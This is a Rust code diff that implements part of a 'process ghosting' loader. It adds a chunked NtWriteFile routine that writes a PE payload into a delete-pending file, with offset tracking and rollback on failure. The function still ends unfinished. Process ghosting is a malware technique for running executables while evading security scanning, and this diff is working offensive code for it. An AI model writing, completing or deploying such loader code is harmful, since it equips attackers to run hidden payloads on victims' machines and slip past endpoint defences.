@@ -124,11 +124,46 @@ pub unsafe fn ghost_process(config: &Config) -> Option<State> {
     debug!("[GHOST] File marked DELETE_PENDING");
 
 
-    /*
-    TODO:
-        Write PE payload into the deleted pending file with explicit offset
-        Supply ByteOffset AND check io_status.information so partial wites cannot silently currupt the PE layout 
-    */
+    // Write PE payload into the deleted pending file with explicit offset
+    // Supply ByteOffset AND check io_status.information so partial wites cannot silently currupt the PE layout 
+    let chunk_size: usize = 4096;
+    let mut written: usize = 0;
+
+    while written < config.pe_payload.len() {
+        let remaining = config.pe_payload.len() - written;
+        let this_chunk = if remaining < chunk_size { remaining } else { chunk_size };
+        
+        let mut byte_offset: i64 = written as i64;
+        io_status = core::mem::zeroed();
+        let status = nt::nt_write_file(
+            state.file_handle,
+            null_mut(),
+            null_mut(),
+            null_mut(),
+            &mut io_status,
+            config.pe_payload.as_ptr().add(written) as *const c_void,
+            this_chunk as u32,
+            &mut byte_offset as *mut _ as *mut c_void,
+            null_mut(),
+        );
+
+        if status != STATUS_SUCCESS {
+            debug!("[GHOST] NtWriteFile failed at offset {}: 0x{:08X}", written, status);
+            state.rollback();
+            return None;
+        }
+
+        let actually_written = io_status.information;
+        if actually_written == 0 {
+            debug!("[GHOST] NtWriteFile wrote 0 bytes at offset {}", written);
+            state.rollback();
+            return None;
+        }
+        written += actually_written;
+    }
+
+
+
     unimplemented!()
 }
 
